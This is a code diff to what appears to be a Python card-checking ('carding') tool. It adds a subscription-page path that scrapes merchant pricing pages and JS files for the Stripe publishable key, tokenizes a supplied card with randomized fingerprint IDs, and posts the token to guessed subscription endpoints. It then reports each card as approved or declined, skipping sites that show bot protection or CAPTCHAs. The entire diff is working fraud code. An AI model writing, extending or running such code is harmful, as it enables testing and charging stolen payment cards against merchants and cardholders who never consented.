@@ -411,6 +411,85 @@ def find_cheapest_product(session: requests.Session, site_url: str) -> dict | No
         except Exception:
             continue
 
+    # 3. Try subscription / membership / pricing pages
+    _SUB_PATHS = [
+        "/pricing",
+        "/plans",
+        "/plan",
+        "/membership",
+        "/memberships",
+        "/join",
+        "/subscribe",
+        "/subscriptions",
+        "/upgrade",
+        "/enroll",
+        "/checkout",
+        "/register",
+    ]
+    # Price + optional billing-period label anywhere on the page
+    _sub_price_re = re.compile(
+        r'[\$£€]\s*([\d,]+\.?\d*)\s*(?:/\s*(?:mo(?:nth)?|yr|year|week|wk|day|annual))?',
+        re.IGNORECASE,
+    )
+    # Optionally paired with a nearby href for the plan CTA
+    _sub_link_re = re.compile(
+        r'href=["\']([^"\']+)["\'][^<]{0,200}?[\$£€]\s*[\d,]+\.?\d*'
+        r'|[\$£€]\s*[\d,]+\.?\d*[^<]{0,200}?href=["\']([^"\']+)["\']',
+        re.IGNORECASE | re.DOTALL,
+    )
+
+    for path in _SUB_PATHS:
+        try:
+            r = session.get(site_url + path, timeout=15)
+
+            protection_error = _detect_bot_protection(r)
+            if protection_error:
+                last_protection_error = protection_error
+                continue
+
+            if _detect_captcha(r.text):
+                return {"error": "Site requires CAPTCHA on subscription page — cannot auto-hit"}
+
+            if r.status_code != 200:
+                continue
+
+            html = r.text
+            # Collect all prices found on this page
+            prices_found = []
+            for m in _sub_price_re.finditer(html):
+                try:
+                    price = float(m.group(1).replace(",", ""))
+                except ValueError:
+                    continue
+                if price > 0:
+                    prices_found.append(price)
+
+            if not prices_found:
+                continue
+
+            cheapest_price = min(prices_found)
+
+            # Try to find a plan link near the cheapest price text
+            plan_url = site_url + path  # default: the pricing page itself
+            for lm in _sub_link_re.finditer(html):
+                href = lm.group(1) or lm.group(2) or ""
+                if href and not href.startswith("http"):
+                    href = site_url + href
+                if href:
+                    plan_url = href
+                    break
+
+            return {
+                "title": f"Subscription Plan (${cheapest_price:.2f})",
+                "price": cheapest_price,
+                "product_url": plan_url,
+                "variant_id": None,
+                "source": "subscription_scrape",
+                "pricing_page": site_url + path,
+            }
+        except Exception:
+            continue
+
     if last_protection_error:
         return {"error": last_protection_error}
 
@@ -435,9 +514,187 @@ def checkout_and_charge(
     Returns "error" when the merchant response is ambiguous or absent.
     """
     product_url = product_info.get("product_url", "")
-    variant_id = product_info.get("variant_id")
+    variant_id  = product_info.get("variant_id")
+    source      = product_info.get("source", "")
 
-    # ── Step 1: Add to cart ───────────────────────────────────────────────────
+    # ── Subscription / Membership path ────────────────────────────────────────
+    # For subscription sites we skip the Shopify cart entirely and instead:
+    #   1. Pull the pricing / plan page to get the Stripe PK
+    #   2. Tokenize the card
+    #   3. POST to common subscription endpoints
+    if source == "subscription_scrape":
+        pricing_page = product_info.get("pricing_page") or product_url or site_url
+
+        # Collect candidate pages where the PK might live
+        candidate_pages = list(dict.fromkeys([
+            pricing_page, product_url, site_url,
+            site_url + "/pricing", site_url + "/plans",
+            site_url + "/checkout", site_url + "/subscribe",
+            site_url + "/membership",
+        ]))
+
+        stripe_pk = None
+        page_html  = ""
+        for page in candidate_pages:
+            if not page:
+                continue
+            try:
+                rp = session.get(page, timeout=15, allow_redirects=True)
+                protection_error = _detect_bot_protection(rp)
+                if protection_error:
+                    return {"status": "error", "message": f"Bot protection at subscription page: {protection_error}", "stripe_pk": None}
+                if _detect_captcha(rp.text):
+                    return {"status": "error", "message": "Site requires CAPTCHA at subscription page — cannot auto-hit", "stripe_pk": None}
+                if rp.status_code == 200:
+                    pk = _extract_stripe_pk(rp.text)
+                    if pk:
+                        stripe_pk = pk
+                        page_html  = rp.text
+                        break
+                    # Keep the html of the first 200-OK page for CSRF
+                    if not page_html:
+                        page_html = rp.text
+            except Exception:
+                continue
+
+        # Also try linked JS files if PK still missing
+        if not stripe_pk and page_html:
+            for js_url in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', page_html, re.IGNORECASE):
+                if any(k in js_url.lower() for k in ("stripe", "checkout", "payment", "billing")):
+                    try:
+                        rj = session.get(urljoin(site_url, js_url), timeout=10)
+                        stripe_pk = _extract_stripe_pk(rj.text)
+                        if stripe_pk:
+                            break
+                    except Exception:
+                        continue
+
+        if not stripe_pk:
+            return {
+                "status": "error",
+                "message": "Stripe PK not found on subscription/pricing pages",
+                "stripe_pk": None,
+            }
+
+        # Tokenize card
+        cc = card["cc"]; mm = card["mm"]; yy = card["yy"]; cvv = card["cvv"]
+
+        def _rand_fp2():
+            r = lambda a, b: random.randint(a, b)
+            return f"{r(10000000,99999999)}-{r(1000,9999)}-{r(1000,9999)}-{r(1000,9999)}-{r(100000000000,999999999999)}"
+
+        try:
+            sub_stripe_resp = requests.post(
+                "https://api.stripe.com/v1/payment_methods",
+                data={
+                    "type": "card",
+                    "card[number]": cc, "card[cvc]": cvv,
+                    "card[exp_month]": mm, "card[exp_year]": yy,
+                    "guid": _rand_fp2(), "muid": _rand_fp2(), "sid": _rand_fp2(),
+                    "key": stripe_pk,
+                },
+                headers={
+                    "authority": "api.stripe.com", "accept": "application/json",
+                    "content-type": "application/x-www-form-urlencoded",
+                    "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
+                    "user-agent": USER_AGENT,
+                },
+                timeout=20,
+            ).json()
+        except Exception as e:
+            return {"status": "error", "message": f"Stripe API error: {str(e)[:50]}", "stripe_pk": stripe_pk}
+
+        if "error" in sub_stripe_resp:
+            err = sub_stripe_resp["error"]
+            code = err.get("code", "")
+            msg  = err.get("message", "Card Declined")
+            _decline_map = {
+                "incorrect_number": "Incorrect Card Number",
+                "invalid_number": "Invalid Card Number",
+                "invalid_expiry_year": "Invalid Expiry Year",
+                "invalid_expiry_month": "Invalid Expiry Month",
+                "invalid_cvc": "Invalid CVC",
+                "expired_card": "Expired Card",
+            }
+            return {"status": "declined", "message": f"Declined - {_decline_map.get(code, msg)}", "stripe_pk": stripe_pk}
+
+        payment_id = sub_stripe_resp.get("id")
+        if not payment_id:
+            return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}
+
+        # Try common subscription API endpoints
+        hidden = _extract_form_fields(page_html)
+        csrf   = hidden.get("csrf_token") or hidden.get("_token") or hidden.get("authenticity_token") or ""
+
+        sub_endpoints = [
+            (f"{site_url}/api/subscribe",       "json"),
+            (f"{site_url}/api/subscription",    "json"),
+            (f"{site_url}/api/billing",         "json"),
+            (f"{site_url}/api/payment",         "json"),
+            (f"{site_url}/api/checkout",        "json"),
+            (f"{site_url}/stripe/charge",       "json"),
+            (f"{site_url}/stripe/subscribe",    "json"),
+            (f"{site_url}/payment/subscribe",   "json"),
+            (f"{site_url}/payment/process",     "json"),
+            (f"{site_url}/subscribe",           "form"),
+            (f"{site_url}/checkout",            "form"),
+            (f"{site_url}/membership/checkout", "form"),
+        ]
+
+        _APPROVE_SIGNALS = re.compile(
+            r'requires_action|3ds|authentication|succeeded|success|approved|active|subscrib',
+            re.IGNORECASE,
+        )
+        _DECLINE_SIGNALS = re.compile(
+            r'declined|do_not_honor|insufficient_funds|card_declined|invalid_card|invalid_cvc'
+            r'|expired_card|lost_card|stolen_card|restricted_card|fail',
+            re.IGNORECASE,
+        )
+
+        for ep_url, ep_fmt in sub_endpoints:
+            try:
+                if ep_fmt == "json":
+                    payload_json = {
+                        "payment_method": payment_id,
+                        "stripe_token": payment_id,
+                        "stripeToken": payment_id,
+                        "csrf_token": csrf,
+                        "_token": csrf,
+                    }
+                    r_ep = session.post(ep_url, json=payload_json, timeout=20,
+                                       headers={"Accept": "application/json",
+                                                "Content-Type": "application/json",
+                                                "X-Requested-With": "XMLHttpRequest"})
+                else:
+                    form_payload = {**hidden, "stripeToken": payment_id,
+                                    "payment_method": payment_id, "stripe_token": payment_id}
+                    r_ep = session.post(ep_url, data=form_payload, timeout=20, allow_redirects=True)
+
+                if r_ep.status_code in (404, 405, 410):
+                    continue
+
+                try:
+                    ep_json = r_ep.json()
+                    ep_text = str(ep_json)
+                except Exception:
+                    ep_text = r_ep.text or ""
+
+                if _APPROVE_SIGNALS.search(ep_text):
+                    return {"status": "approved", "message": f"Approved - Subscription charged ({ep_url})", "stripe_pk": stripe_pk}
+                if _DECLINE_SIGNALS.search(ep_text):
+                    reason = re.search(r'(?:message|error)["\s:]+([^"}{,\n]{3,80})', ep_text, re.IGNORECASE)
+                    reason_str = reason.group(1).strip() if reason else "Card Declined"
+                    return {"status": "declined", "message": f"Declined - {reason_str}", "stripe_pk": stripe_pk}
+            except Exception:
+                continue
+
+        return {
+            "status": "error",
+            "message": "Card tokenized but no subscription endpoint responded (site may use JS-only checkout)",
+            "stripe_pk": stripe_pk,
+        }
+
+    # ── Step 1: Add to cart (Shopify / generic) ───────────────────────────────
     cart_added = False
     if variant_id:
         try:
@@ -709,7 +966,9 @@ def setup_wah_session(site_url: str, email: str, password: str) -> dict:
 
     product = find_cheapest_product(session, site_url)
     if not product:
-        return {"ok": False, "error": "No products found on site"}
+        return {"ok": False, "error": "No products or subscription plans found on site"}
+    if isinstance(product, dict) and "error" in product:
+        return {"ok": False, "error": product["error"]}
 
     return {"ok": True, "session": session, "product": product, "site_url": site_url}
 
